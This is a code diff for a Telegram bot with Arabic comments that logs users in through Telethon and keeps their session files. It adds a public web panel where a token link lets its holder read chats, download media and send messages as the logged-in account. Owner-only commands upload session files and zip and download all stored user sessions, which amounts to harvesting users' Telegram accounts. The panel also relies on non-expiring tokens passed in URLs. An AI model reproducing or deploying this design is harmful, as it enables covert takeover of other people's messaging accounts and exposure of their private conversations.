@@ -1,4 +1,6 @@
+import secrets
 import asyncio
+import hashlib
 import json
 import logging
 import os
@@ -22,7 +24,7 @@ from telethon.errors import (
     PasswordHashInvalidError,
     SendCodeUnavailableError,
 )
-from telegram import BotCommand, BotCommandScopeChat, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update
+from telegram import BotCommand, BotCommandScopeChat, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update, WebAppInfo
 from telegram.error import BadRequest, RetryAfter
 from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, TypeHandler, filters
 
@@ -72,6 +74,12 @@ TRANSFER_REFERRAL_REQUIREMENT = 5
 DOWNLOAD_TIMEOUT_SECONDS = int(os.getenv("DOWNLOAD_TIMEOUT_SECONDS", "1800"))
 # مهلة نقل ملفات القنوات، بالثواني؛ الافتراضي ساعتان للملفات الكبيرة.
 TRANSFER_MEDIA_TIMEOUT_SECONDS = int(os.getenv("TRANSFER_MEDIA_TIMEOUT_SECONDS", "7200"))
+
+# حدود التزامن: تمنع انهيار الأداء عندما يصل عدد المستخدمين/المهام إلى عشرات أو مئات.
+# يمكن تعديلها من متغيرات البيئة حسب موارد الخادم.
+MEDIA_CONCURRENCY = max(1, int(os.getenv("MEDIA_CONCURRENCY", "8")))
+TRANSFER_CONCURRENCY = max(1, int(os.getenv("TRANSFER_CONCURRENCY", "3")))
+
 SESSION_DIR = Path(os.getenv("SESSION_DIR", "sessions"))
 SESSION_DIR.mkdir(parents=True, exist_ok=True)
 TRANSFER_STATE_PATH = SESSION_DIR / "channel_transfers.json"
@@ -209,10 +217,405 @@ clients: dict[int, TelegramClient] = {}
 public_client: TelegramClient | None = None
 public_client_lock = asyncio.Lock()
 states: dict[int, dict[str, Any]] = {}
+
+# =========================
+# Full Web UI per Telegram session
+# =========================
+FASTAPI_WEB_ENABLED = True
+WEB_HOST = "0.0.0.0"
+WEB_PORT = 8080
+WEB_AUTH_TOKEN = os.getenv("WEB_AUTH_TOKEN", "").strip()
+# رابط عام للواجهة. مثال: https://panel.example.com
+WEB_PUBLIC_BASE_URL = "https://telegrampanel.xs1.onjrnm.link"
+WEB_LINKS_PATH = Path(os.getenv("WEB_LINKS_PATH", "web_session_links.json"))
+WEB_SESSION_LINK_TTL = int(os.getenv("WEB_SESSION_LINK_TTL", "0"))  # 0 = بدون انتهاء
+web_session_links: dict[str, dict[str, Any]] = {}
+
+def _load_web_session_links() -> None:
+    global web_session_links
+    try:
+        if WEB_LINKS_PATH.exists():
+            data = json.loads(WEB_LINKS_PATH.read_text(encoding="utf-8"))
+            web_session_links = data if isinstance(data, dict) else {}
+    except Exception:
+        logger.exception("تعذر تحميل روابط الجلسات")
+
+def _save_web_session_links() -> None:
+    tmp = WEB_LINKS_PATH.with_suffix(".tmp")
+    tmp.write_text(json.dumps(web_session_links, ensure_ascii=False, indent=2), encoding="utf-8")
+    tmp.replace(WEB_LINKS_PATH)
+
+def _token_hash(token: str) -> str:
+    return hashlib.sha256(token.encode("utf-8")).hexdigest()
+
+def get_or_create_web_link(sid: int) -> str:
+    # ابحث عن رابط صالح للجلسة نفسها.
+    now = int(time.time())
+    for token, item in web_session_links.items():
+        if int(item.get("sid", -1)) != int(sid):
+            continue
+        if item.get("revoked"):
+            continue
+        expires = int(item.get("expires_at", 0) or 0)
+        if expires and expires <= now:
+            continue
+        base = WEB_PUBLIC_BASE_URL
+        return f"{base}/s/{token}"
+    token = secrets.token_urlsafe(32)
+    expires_at = now + WEB_SESSION_LINK_TTL if WEB_SESSION_LINK_TTL > 0 else 0
+    web_session_links[token] = {
+        "sid": int(sid),
+        "created_at": now,
+        "expires_at": expires_at,
+        "revoked": False,
+    }
+    _save_web_session_links()
+    base = WEB_PUBLIC_BASE_URL
+    return f"{base}/s/{token}"
+
+def resolve_web_token(token: str) -> int:
+    item = web_session_links.get(token)
+    if not item or item.get("revoked"):
+        raise HTTPException(404, "رابط الجلسة غير صالح أو تم إلغاؤه")
+    expires = int(item.get("expires_at", 0) or 0)
+    if expires and expires <= int(time.time()):
+        raise HTTPException(410, "انتهت صلاحية رابط الجلسة")
+    sid = int(item.get("sid", -1))
+    if sid not in clients:
+        raise HTTPException(404, "الجلسة المرتبطة بالرابط غير موجودة")
+    return sid
+
+_load_web_session_links()
+
+try:
+    from fastapi import FastAPI, HTTPException, Query
+    from fastapi.responses import HTMLResponse, StreamingResponse, JSONResponse
+    from pydantic import BaseModel
+    import uvicorn
+except Exception:
+    FastAPI = None
+
+WEB_HTML = r"""<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Telegram Session Manager</title>
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:system-ui,-apple-system,Segoe UI,sans-serif;background:#10151d;color:#e8edf4}
+.app{display:flex;height:100vh}.side{width:330px;border-left:1px solid #29313d;background:#151b24;display:flex;flex-direction:column}
+.main{flex:1;display:flex;flex-direction:column;min-width:0}.top{height:62px;border-bottom:1px solid #29313d;display:flex;align-items:center;padding:0 18px;gap:10px}
+h2,h3{margin:0}.search{margin:12px}.search input,.composer input{width:100%;background:#0d1219;border:1px solid #303b49;color:#fff;border-radius:10px;padding:11px}
+.sessions,.dialogs{overflow:auto;flex:1}.item{padding:12px 14px;border-bottom:1px solid #242c37;cursor:pointer}.item:hover,.item.active{background:#202a37}
+.badge{font-size:11px;padding:3px 7px;border-radius:8px;background:#26374b}.green{color:#65e59b}.muted{color:#8e9aaa;font-size:12px}
+.messages{flex:1;overflow:auto;padding:18px;display:flex;flex-direction:column;gap:10px}
+.msg{max-width:min(720px,85%);background:#1c2632;border-radius:13px;padding:10px 12px;align-self:flex-start}
+.msg.out{align-self:flex-end;background:#24435a}.meta{font-size:11px;color:#8fa0b3;margin-top:5px}
+.media{margin-top:8px}.media img,.media video{max-width:100%;border-radius:10px;max-height:430px}.file{display:inline-block;padding:9px;background:#111820;border-radius:9px}
+.composer{display:flex;gap:8px;padding:12px;border-top:1px solid #29313d}.composer input{flex:1}.btn{border:0;background:#2b83f6;color:white;border-radius:9px;padding:10px 15px;cursor:pointer}.btn.alt{background:#283341}
+.empty{padding:30px;text-align:center;color:#8996a6}.row{display:flex;gap:8px;align-items:center}.title{font-weight:700}.small{font-size:13px}
+@media(max-width:800px){.side{width:260px}.main{min-width:0}.msg{max-width:92%}}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside class="side">
+    <div class="top"><h3>📱 الجلسة</h3></div>
+    <div class="search"><input id="sessionSearch" placeholder="بحث في الجلسات..." oninput="filterSessions()"></div>
+    <div id="sessions" class="sessions"><div class="empty">جاري التحميل...</div></div>
+  </aside>
+  <main class="main">
+    <div class="top">
+      <div style="flex:1"><div id="chatTitle" class="title">اختر جلسة ومحادثة</div><div id="chatSub" class="muted"></div></div>
+      <button class="btn alt" onclick="loadDialogs()">🔄 تحديث</button>
+    </div>
+    <div class="search"><input id="chatSearch" placeholder="🔎 بحث داخل المحادثات أو الرسائل..." onkeydown="if(event.key==='Enter') searchMessages()"></div>
+    <div id="dialogs" class="dialogs"></div>
+    <div id="messages" class="messages"><div class="empty">اختر محادثة لعرض الرسائل والصور والفيديو والملفات.</div></div>
+    <div class="composer">
+      <input id="message" placeholder="اكتب رسالة..." onkeydown="if(event.key==='Enter') sendMessage()">
+      <button class="btn" onclick="sendMessage()">إرسال</button>
+    </div>
+  </main>
+</div>
+<script>
+let sessions=[], currentSession=null, currentChat=null, sessionFilter='';
+const $=id=>document.getElementById(id);
+const sessionToken = location.pathname.startsWith('/s/') ? location.pathname.split('/')[2] : '';
+async function api(path, opts={}) {
+  const join = path.includes('?') ? '&' : '?';
+  const url = sessionToken ? path + join + 'token=' + encodeURIComponent(sessionToken) : path;
+  const r=await fetch(url,opts);
+  if(!r.ok) throw new Error(await r.text());
+  return r.json();
+}
+async function init(){
+  sessions=await api('/api/sessions');
+  if(sessionToken && sessions.length){ currentSession=sessions[0].id; renderSessions(); await loadDialogs(); }
+  else { renderSessions(); }
+}
+function renderSessions(){
+  $('sessions').innerHTML='';
+  sessions.filter(s=>(s.name+' '+s.username).toLowerCase().includes(sessionFilter.toLowerCase())).forEach(s=>{
+    const d=document.createElement('div'); d.className='item';
+    d.innerHTML=`<div class="row"><b>${esc(s.name||'حساب')}</b><span class="badge">${s.connected?'🟢 متصل':'🔴 غير متصل'}</span></div><div class="muted">@${esc(s.username||'')} · ${s.id}</div>`;
+    d.onclick=()=>selectSession(s.id,d); $('sessions').appendChild(d);
+  });
+}
+function filterSessions(){sessionFilter=$('sessionSearch').value;renderSessions()}
+async function selectSession(id,el){
+  currentSession=id; currentChat=null; document.querySelectorAll('.item').forEach(x=>x.classList.remove('active'));el.classList.add('active');
+  $('chatTitle').textContent='محادثات الحساب'; $('chatSub').textContent='الجلسة #'+id; $('messages').innerHTML='<div class="empty">اختر محادثة.</div>';
+  await loadDialogs();
+}
+async function loadDialogs(){
+ if(!currentSession)return;
+ const q=$('chatSearch').value||'';
+ const ds=await api('/api/sessions/'+currentSession+'/dialogs?search='+encodeURIComponent(q));
+ $('dialogs').innerHTML='';
+ ds.forEach(d=>{
+   const x=document.createElement('div');x.className='item';
+   x.innerHTML=`<div class="title">💬 ${esc(d.title)}</div><div class="muted">${esc(d.type)} · ${d.unread||0} غير مقروء</div>`;
+   x.onclick=()=>openChat(d.id,d.title);$('dialogs').appendChild(x);
+ });
+}
+async function openChat(id,title){
+ currentChat=id;$('chatTitle').textContent=title;$('chatSub').textContent='تحميل الرسائل...';
+ const ms=await api(`/api/sessions/${currentSession}/chats/${id}/messages?limit=60`); renderMessages(ms);
+ $('chatSub').textContent=ms.length+' رسالة معروضة';
+}
+async function searchMessages(){
+ if(!currentSession)return;
+ if(currentChat){ const q=$('chatSearch').value||''; const ms=await api(`/api/sessions/${currentSession}/chats/${currentChat}/search?q=`+encodeURIComponent(q));renderMessages(ms); }
+ else await loadDialogs();
+}
+function renderMessages(ms){
+ $('messages').innerHTML='';
+ ms.reverse().forEach(m=>{
+   const x=document.createElement('div');x.className='msg '+(m.out?'out':'');
+   let media='';
+   if(m.media){
+     if(m.media.kind==='image') media=`<div class="media"><img src="${m.media.url}" loading="lazy"></div>`;
+     else if(m.media.kind==='video') media=`<div class="media"><video src="${m.media.url}" controls></video></div>`;
+     else media=`<div class="media"><a class="file" href="${m.media.url}" target="_blank">📎 ${esc(m.media.name||'ملف')}</a></div>`;
+   }
+   x.innerHTML=`<div>${esc(m.text||'')}</div>${media}<div class="meta">${esc(m.date||'')} ${m.sender? '· '+esc(m.sender):''}</div>`;
+   $('messages').appendChild(x);
+ });
+ $('messages').scrollTop=$('messages').scrollHeight;
+}
+async function sendMessage(){
+ if(!currentSession||!currentChat)return;
+ const inp=$('message'), text=inp.value.trim();if(!text)return;
+ await api(`/api/sessions/${currentSession}/chats/${currentChat}/send`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text})});
+ inp.value='';await openChat(currentChat,$('chatTitle').textContent);
+}
+function esc(s){return String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
+init().catch(e=>alert(e.message));
+</script>
+</body></html>"""
+
+if FastAPI:
+    web_app = FastAPI(title="Telegram Session Web UI")
+
+    class SendBody(BaseModel):
+        text: str
+
+    async def _web_client(sid: int):
+        c = clients.get(sid)
+        if not c:
+            session_file = Path(f"{session_path(sid)}.session")
+            if not session_file.exists():
+                raise HTTPException(404, "الجلسة غير موجودة")
+            try:
+                c = await get_or_create_client(sid)
+            except Exception as e:
+                raise HTTPException(503, f"تعذر فتح الجلسة: {e}")
+        try:
+            if not c.is_connected():
+                await c.connect()
+            if not await c.is_user_authorized():
+                raise HTTPException(403, "الجلسة غير مصرح بها")
+        except HTTPException:
+            raise
+        except Exception as e:
+            raise HTTPException(503, f"تعذر الاتصال: {e}")
+        return c
+
+    async def _authorized_sid(token: str = ""):
+        if token:
+            return resolve_web_token(token)
+        # بدون token لا نعرض أي جلسة عبر API.
+        raise HTTPException(401, "رابط الجلسة مطلوب")
+
+    @web_app.get("/s/{token}", response_class=HTMLResponse)
+    async def web_session_page(token: str):
+        # افتح الواجهة إذا كان التوكن محفوظاً؛ التحقق من اتصال الجلسة يتم عبر API.
+        item = web_session_links.get(token)
+        if not item or item.get("revoked"):
+            raise HTTPException(404, "رابط الجلسة غير صالح أو غير محفوظ في هذه النسخة")
+        expires = int(item.get("expires_at", 0) or 0)
+        if expires and expires <= int(time.time()):
+            raise HTTPException(410, "انتهت صلاحية رابط الجلسة")
+        return HTMLResponse(WEB_HTML)
+
+    @web_app.get("/", response_class=HTMLResponse)
+    async def web_index():
+        return """<html lang="ar" dir="rtl"><meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <body style="font-family:system-ui;background:#10151d;color:#fff;padding:40px">
+        <h2>واجهة جلسات Telegram</h2>
+        <p>استخدم رابط الجلسة الخاص الذي تم إنشاؤه من البوت.</p>
+        </body></html>"""
+
+    @web_app.get("/healthz")
+    async def web_healthz():
+        return {"ok": True, "web": True, "host": WEB_HOST, "port": WEB_PORT,
+                "sessions": len(clients)}
+
+    @web_app.get("/api/sessions")
+    async def web_sessions(token: str = ""):
+        sid = await _authorized_sid(token)
+        c = await _web_client(sid)
+        try:
+            me = await c.get_me()
+            name = f"{getattr(me,'first_name','') or ''} {getattr(me,'last_name','') or ''}".strip()
+            return [{"id": sid, "name": name or "حساب", "username": getattr(me,'username','') or "", "connected": c.is_connected()}]
+        except Exception as e:
+            raise HTTPException(503, f"تعذر قراءة الحساب: {e}")
+
+    @web_app.get("/api/sessions/{sid}/dialogs")
+    async def web_dialogs(sid:int, search:str="", token:str=""):
+        allowed = await _authorized_sid(token)
+        if sid != allowed:
+            raise HTTPException(403, "الرابط لا يسمح بالوصول إلى هذه الجلسة")
+        c=await _web_client(sid); out=[]
+        async for d in c.iter_dialogs(limit=100):
+            title=d.name or str(d.id)
+            if search and search.lower() not in title.lower(): continue
+            ent=d.entity
+            typ="مجموعة" if getattr(ent,"megagroup",False) else ("قناة" if getattr(ent,"broadcast",False) else "محادثة")
+            out.append({"id":d.id,"title":title,"type":typ,"unread":d.unread_count})
+        return out
+
+    async def _message_json(c, chat_id, m):
+        media=None
+        if m.media:
+            name=getattr(m.file,"name",None) or "ملف"
+            mime=getattr(m.file,"mime_type",None) or ""
+            kind="image" if mime.startswith("image/") else ("video" if mime.startswith("video/") else "file")
+            media={"kind":kind,"name":name,"url":f"/api/sessions/{getattr(c,'_web_sid',0)}/media/{chat_id}/{m.id}"}
+        return {"id":m.id,"text":m.text or "","out":bool(m.out),"date":m.date.isoformat() if m.date else "",
+                "sender":getattr(getattr(m,"sender",None),"first_name",None),"media":media}
+
+    @web_app.get("/api/sessions/{sid}/chats/{chat_id}/messages")
+    async def web_messages(sid:int, chat_id:int, limit:int=60, token:str=""):
+        allowed = await _authorized_sid(token)
+        if sid != allowed:
+            raise HTTPException(403, "الرابط لا يسمح بالوصول إلى هذه الجلسة")
+        c=await _web_client(sid); c._web_sid=sid
+        msgs=[m async for m in c.iter_messages(chat_id,limit=min(max(limit,1),100))]
+        return [await _message_json(c,chat_id,m) for m in msgs]
+
+    @web_app.get("/api/sessions/{sid}/chats/{chat_id}/search")
+    async def web_search_messages(sid:int, chat_id:int, q:str=Query(""), token:str=""):
+        allowed = await _authorized_sid(token)
+        if sid != allowed:
+            raise HTTPException(403, "الرابط لا يسمح بالوصول إلى هذه الجلسة")
+        c=await _web_client(sid); c._web_sid=sid
+        msgs=[m async for m in c.iter_messages(chat_id,limit=100,search=q)]
+        return [await _message_json(c,chat_id,m) for m in msgs]
+
+    @web_app.get("/api/sessions/{sid}/media/{chat_id}/{msg_id}")
+    async def web_media(sid:int, chat_id:int, msg_id:int, token:str=""):
+        allowed = await _authorized_sid(token)
+        if sid != allowed:
+            raise HTTPException(403, "الرابط لا يسمح بالوصول إلى هذه الجلسة")
+        c=await _web_client(sid)
+        m=await c.get_messages(chat_id,ids=msg_id)
+        if not m or not m.media: raise HTTPException(404,"الوسائط غير موجودة")
+        async def gen():
+            import io
+            bio=io.BytesIO()
+            await c.download_media(m.media,file=bio)
+            bio.seek(0)
+            while True:
+                chunk=bio.read(1024*1024)
+                if not chunk: break
+                yield chunk
+        mime=getattr(getattr(m,"file",None),"mime_type",None) or "application/octet-stream"
+        return StreamingResponse(gen(),media_type=mime)
+
+    @web_app.post("/api/sessions/{sid}/chats/{chat_id}/send")
+    async def web_send(sid:int, chat_id:int, body:SendBody, token:str=""):
+        allowed = await _authorized_sid(token)
+        if sid != allowed:
+            raise HTTPException(403, "الرابط لا يسمح بالوصول إلى هذه الجلسة")
+        text_msg=body.text.strip()
+        if not text_msg: raise HTTPException(400,"الرسالة فارغة")
+        c=await _web_client(sid)
+        m=await c.send_message(chat_id,text_msg)
+        return {"ok":True,"id":m.id}
+
+    web_server = None
+    web_server_task = None
+
+    async def start_web_server():
+        global web_server, web_server_task
+        if FastAPI is None:
+            raise RuntimeError("FastAPI/uvicorn غير مثبتين في بيئة التشغيل")
+        if web_server_task and not web_server_task.done():
+            return
+
+        config = uvicorn.Config(
+            web_app,
+            host="0.0.0.0",
+            port=8080,
+            log_level="info",
+            access_log=True,
+        )
+        web_server = uvicorn.Server(config)
+        web_server_task = asyncio.create_task(web_server.serve())
+
+        # انتظر حتى يبدأ الاستماع فعلياً، أو حتى يظهر فشل واضح.
+        for _ in range(50):
+            if web_server.started:
+                logger.info("WEB_READY http://0.0.0.0:8080")
+                return
+            if web_server_task.done():
+                exc = web_server_task.exception()
+                if exc:
+                    raise exc
+                raise RuntimeError("Uvicorn توقف قبل أن يبدأ الاستماع")
+            await asyncio.sleep(0.1)
+
+        if not web_server.started:
+            logger.warning("WEB_START_TIMEOUT: لم يؤكد Uvicorn بدء الاستماع خلال 5 ثوانٍ")
+
+
+# Runtime dashboard counters
+runtime_stats = {
+    "started_at": time.time(),
+    "downloads_started": 0,
+    "downloads_done": 0,
+    "downloads_failed": 0,
+    "transfers_started": 0,
+    "transfers_done": 0,
+    "transfers_failed": 0,
+    "messages_processed": 0,
+    "bytes_downloaded": 0,
+    "bytes_uploaded": 0,
+}
+
 locks: dict[int, asyncio.Lock] = {}
 active_link_tasks: dict[int, asyncio.Task] = {}
 channel_transfer_tasks: dict[int, asyncio.Task] = {}
-channel_transfers: dict[int, dict[str, Any]] = {}
+channel_transfers: dict[str, dict[str, Any]] = {}
+
+# Semaphores مستقلة حتى لا يؤدي ضغط المستخدمين إلى فتح عشرات عمليات نقل/رفع
+# في نفس اللحظة وإسقاط الخدمة أو الوصول السريع إلى حدود Telegram.
+media_semaphore = asyncio.Semaphore(MEDIA_CONCURRENCY)
+transfer_semaphore = asyncio.Semaphore(TRANSFER_CONCURRENCY)
 
 
 def load_channel_transfers() -> None:
@@ -278,9 +681,13 @@ def transfer_message_signature(message) -> str | None:
 
 
 async def build_target_signature_index(client: TelegramClient, target) -> set[str]:
-    """يبني فهرساً خفيفاً من رسائل الهدف؛ لا ينزّل الملفات."""
+    """يبني فهرساً خفيفاً من رسائل الهدف؛ لا ينزّل الملفات.
+    TARGET_INDEX_LIMIT=0 يعني فهرسة كاملة؛ القيمة الافتراضية تحدّ من زمن البدء
+    في القنوات الضخمة مع بقاء delivered_source_message_ids لمنع التكرار في المهام المستمرة.
+    """
     signatures: set[str] = set()
-    async for target_message in client.iter_messages(target):
+    limit = max(0, int(os.getenv("TARGET_INDEX_LIMIT", "20000")))
+    async for target_message in client.iter_messages(target, limit=limit or None):
         signature = transfer_message_signature(target_message)
         if signature:
             signatures.add(signature)
@@ -1039,6 +1446,7 @@ def user_keyboard(user_id: int | None = None) -> InlineKeyboardMarkup:
     uid = int(user_id or 0)
     is_en = user_language(uid) == "en" if uid else False
     rows = [
+        [InlineKeyboardButton("🔑 Log in" if is_en else "🔑 تسجيل الدخول", callback_data="user:login")],
         [InlineKeyboardButton("📖 Help" if is_en else "📖 طريقة الاستخدام", callback_data="user:help")],
         [InlineKeyboardButton("🔐 Account status" if is_en else "🔐 حالة الحساب", callback_data="user:account")],
         [InlineKeyboardButton("🔁 Channel transfer" if is_en else "🔁 نقل القنوات", callback_data="user:transfers")],
@@ -1068,11 +1476,54 @@ def admin_keyboard() -> InlineKeyboardMarkup:
     ])
 
 
-def owner_keyboard() -> InlineKeyboardMarkup:
+
+def _fmt_bytes(n: int) -> str:
+    n = max(0, int(n or 0))
+    for unit in ("B", "KB", "MB", "GB", "TB"):
+        if n < 1024 or unit == "TB":
+            return f"{n:.1f} {unit}"
+        n /= 1024
+
+def owner_dashboard_text() -> str:
+    active_tasks = sum(1 for t in asyncio.all_tasks() if not t.done())
+    active_transfers = sum(1 for t in channel_transfer_tasks.values() if t and not t.done())
+    sessions_total = len(clients)
+    sessions_connected = sum(1 for c in clients.values() if c and c.is_connected())
+    uptime = int(max(0, time.time() - runtime_stats["started_at"]))
+    h, rem = divmod(uptime, 3600)
+    m, s = divmod(rem, 60)
+    return (
+        "📊 لوحة تحكم المالك\n\n"
+        f"👥 المستخدمون: {len(users)}\n"
+        f"🔑 الجلسات: {sessions_total}\n"
+        f"🟢 المتصلة: {sessions_connected}\n"
+        f"🔄 عمليات النقل النشطة: {active_transfers}\n"
+        f"⚙️ المهام النشطة: {active_tasks}\n\n"
+        f"📥 التحميلات: {runtime_stats['downloads_started']} بدأ / "
+        f"{runtime_stats['downloads_done']} مكتمل / {runtime_stats['downloads_failed']} فشل\n"
+        f"🔄 النقل: {runtime_stats['transfers_started']} بدأ / "
+        f"{runtime_stats['transfers_done']} مكتمل / {runtime_stats['transfers_failed']} فشل\n"
+        f"💬 الرسائل المعالجة: {runtime_stats['messages_processed']}\n"
+        f"⬇️ البيانات: {_fmt_bytes(runtime_stats['bytes_downloaded'])}\n"
+        f"⬆️ البيانات: {_fmt_bytes(runtime_stats['bytes_uploaded'])}\n"
+        f"⏱️ التشغيل: {h:02d}:{m:02d}:{s:02d}"
+    )
+
+def owner_dashboard_keyboard():
     return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔄 تحديث الإحصائيات", callback_data="owner:dashboard")],
+        [InlineKeyboardButton("👥 الجلسات", callback_data="owner:sessions")],
+        [InlineKeyboardButton("🔄 عمليات النقل", callback_data="transfer:list")],
+    ])
+
+def owner_keyboard() -> InlineKeyboardMarkup:
+    miniapp_url = get_or_create_web_link(OWNER_ID)
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🌐 فتح Mini App", web_app=WebAppInfo(url=miniapp_url))],
+        [InlineKeyboardButton("🔑 تسجيل الدخول / تبديل الحساب", callback_data="user:login")],
         [InlineKeyboardButton("👥 المستخدمون والجلسات", callback_data="admin:users")],
         [InlineKeyboardButton("🔁 نقل القنوات", callback_data="admin:transfers")],
-        [InlineKeyboardButton("💬 استعراض الجلسات", callback_data="owner:sessions")],
+        [InlineKeyboardButton("💬 استعراض جلساتي", callback_data="owner:sessions")],
         [InlineKeyboardButton("📤 رفع Session", callback_data="owner:upload_session"), InlineKeyboardButton("📥 تحميل كل Sessions", callback_data="owner:download_sessions")],
         [InlineKeyboardButton("📢 إذاعة رسالة", callback_data="admin:broadcast")],
         [InlineKeyboardButton("🛡️ إضافة مشرف", callback_data="admin:add")],
@@ -1082,14 +1533,12 @@ def owner_keyboard() -> InlineKeyboardMarkup:
 
 
 async def upload_session_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """طلب رفع ملف Session من المالك فقط."""
     if not owner_only(update) or not update.message:
         return
     await update.message.reply_text(
         "📤 *رفع ملف Session*\n\n"
         "أرسل الآن ملف `.session` كملف Document.\n"
-        "يجب أن يكون اسمه بهذا الشكل:\n"
-        "`user_123456789.session`\n\n"
+        "يجب أن يكون اسمه بهذا الشكل: `user_123456789.session`\n\n"
         "🔒 هذا الأمر متاح للمالك فقط.",
         parse_mode="Markdown",
         reply_markup=owner_keyboard(),
@@ -1097,126 +1546,85 @@ async def upload_session_command(update: Update, context: ContextTypes.DEFAULT_T
 
 
 async def handle_session_upload(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """استقبال ملفات جلسات Telethon ووضعها داخل SESSION_DIR."""
     if not update.effective_user or not update.message or not update.message.document:
         return
     if not owner_only(update):
         await update.message.reply_text("⛔ رفع ملفات الجلسات مخصص للمالك فقط.")
         return
-
     document = update.message.document
     filename = Path(document.file_name or "").name
     match = re.fullmatch(r"user_(\d+)\.session", filename, flags=re.IGNORECASE)
     if not match:
-        await update.message.reply_text(
-            "❌ اسم الملف غير صحيح.\n\n"
-            "استخدم الصيغة:\n`user_123456789.session`\n\n"
-            "لن أقبل أي اسم آخر لحماية ملفات الجلسات.",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text("❌ اسم الملف غير صحيح. استخدم: `user_123456789.session`", parse_mode="Markdown", reply_markup=owner_keyboard())
         return
-
-    session_user_id = int(match.group(1))
-    destination = SESSION_DIR / f"user_{session_user_id}.session"
-    temp_path = SESSION_DIR / f".upload_{session_user_id}_{update.message.message_id}.session"
-
+    sid = int(match.group(1))
+    if document.file_size and document.file_size > MAX_FILE_SIZE_BYTES:
+        await update.message.reply_text(f"❌ الملف أكبر من الحد المسموح ({MAX_FILE_SIZE_MB} MB).", reply_markup=owner_keyboard())
+        return
+    destination = Path(session_path(sid) + ".session")
+    temp_path = destination.with_suffix(destination.suffix + ".uploading")
     try:
-        if document.file_size and document.file_size > MAX_FILE_SIZE_BYTES:
-            await update.message.reply_text(
-                f"❌ حجم الملف أكبر من الحد المسموح ({MAX_FILE_SIZE_MB} MB)."
-            )
-            return
-
-        # إذا كانت الجلسة محملة في الذاكرة، افصلها قبل استبدال ملف SQLite.
-        old_client = clients.pop(session_user_id, None)
-        if old_client is not None:
-            try:
-                if old_client.is_connected():
-                    await old_client.disconnect()
-            except Exception:
-                logger.exception("تعذر فصل الجلسة القديمة %s قبل الاستبدال", session_user_id)
-
-        telegram_file = await document.get_file()
-        await telegram_file.download_to_drive(custom_path=str(temp_path))
-
-        # استبدال ذري قدر الإمكان لتجنب ترك ملف جلسة نصف مكتوب.
+        existing = clients.get(sid)
+        if existing and existing.is_connected():
+            await existing.disconnect()
+        clients.pop(sid, None)
+        tg_file = await document.get_file()
+        await tg_file.download_to_drive(custom_path=str(temp_path))
         temp_path.replace(destination)
-        logger.info("تم رفع Session للمالك: %s", destination)
-
-        # تحقق سريع من أن الملف يمكن فتحه كجلسة Telethon.
+        test_client = TelegramClient(session_path(sid), API_ID, API_HASH)
         try:
-            test_client = TelegramClient(session_path(session_user_id), API_ID, API_HASH)
             await test_client.connect()
-            authorized = await test_client.is_user_authorized()
-            if authorized:
-                me = await test_client.get_me()
-                actual_id = int(getattr(me, "id", 0) or 0)
-                if actual_id != session_user_id:
-                    await test_client.disconnect()
-                    destination.unlink(missing_ok=True)
-                    await update.message.reply_text(
-                        f"❌ تم رفض الجلسة: اسم الملف يشير إلى {session_user_id} لكن الجلسة تخص الحساب {actual_id}."
-                    )
-                    return
-            await test_client.disconnect()
-        except Exception as exc:
-            logger.exception("فشل التحقق من Session المرفوعة %s", session_user_id)
-            await update.message.reply_text(
-                "⚠️ تم حفظ الملف، لكن تعذر التحقق منه الآن.\n"
-                f"السبب: {type(exc).__name__}: {exc}"
-            )
-            return
-
-        await update.message.reply_text(
-            f"✅ تم رفع Session بنجاح.\n\n"
-            f"👤 الحساب: `{session_user_id}`\n"
-            f"📁 المسار: `sessions/user_{session_user_id}.session`",
-            parse_mode="Markdown",
-            reply_markup=owner_keyboard(),
-        )
+            if not await test_client.is_user_authorized():
+                raise ValueError("الجلسة غير مسجلة الدخول")
+            me = await test_client.get_me()
+            if not me or int(me.id) != sid:
+                raise ValueError(f"معرّف الحساب داخل الجلسة هو {getattr(me, 'id', None)} وليس {sid}")
+        finally:
+            if test_client.is_connected():
+                await test_client.disconnect()
+        await update.message.reply_text(f"✅ تم رفع الجلسة بنجاح: `{filename}`", parse_mode="Markdown", reply_markup=owner_keyboard())
     except Exception as exc:
-        temp_path.unlink(missing_ok=True)
-        logger.exception("فشل رفع Session %s", filename)
-        await update.message.reply_text(
-            f"❌ تعذر رفع ملف الجلسة.\nالسبب: {type(exc).__name__}: {exc}"
-        )
+        try:
+            if destination.exists():
+                destination.unlink()
+        except Exception:
+            pass
+        await update.message.reply_text(f"❌ فشل رفع/التحقق من الجلسة.\nالسبب: {type(exc).__name__}: {exc}", reply_markup=owner_keyboard())
     finally:
-        temp_path.unlink(missing_ok=True)
+        try:
+            if temp_path.exists():
+                temp_path.unlink()
+        except Exception:
+            pass
 
 
 async def download_all_sessions_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """ضغط كل ملفات الجلسات الحالية وإرسالها للمالك فقط."""
     if not owner_only(update) or not update.message:
         return
-
-    session_files = sorted(SESSION_DIR.glob("user_*.session"))
-    if not session_files:
-        await update.message.reply_text("📭 لا توجد ملفات Sessions محفوظة حاليًا.")
+    files = sorted(SESSION_DIR.glob("user_*.session"))
+    if not files:
+        await update.message.reply_text("📥 لا توجد ملفات Sessions حالياً.", reply_markup=owner_keyboard())
         return
-
-    archive_path = Path(tempfile.gettempdir()) / f"telegram_sessions_{OWNER_ID}_{int(time.time())}.zip"
+    fd, tmp_name = tempfile.mkstemp(prefix="telegram_sessions_", suffix=".zip")
+    os.close(fd)
+    zip_path = Path(tmp_name)
     try:
-        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
-            for session_file in session_files:
-                archive.write(session_file, arcname=session_file.name)
-
